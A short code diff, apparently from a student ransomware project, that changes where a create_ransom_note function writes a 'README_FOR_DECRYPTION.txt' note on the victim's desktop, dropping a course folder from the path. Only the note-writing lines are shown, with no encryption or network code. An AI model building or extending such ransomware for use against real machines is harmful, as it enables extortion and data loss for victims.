@@ -45,7 +45,7 @@ def create_ransom_note():
     """
 
     # Create the ransom note on the victim's desktop
-    ransom_note_path = str(pathlib.Path.home()) + '/Desktop/Test/CS440/README_FOR_DECRYPTION.txt'
+    ransom_note_path = str(pathlib.Path.home()) + '/Desktop/Test/README_FOR_DECRYPTION.txt'
     try:
         with open(ransom_note_path, "w") as ransom_note_file:
             ransom_note_file.write(ransom_note_content)
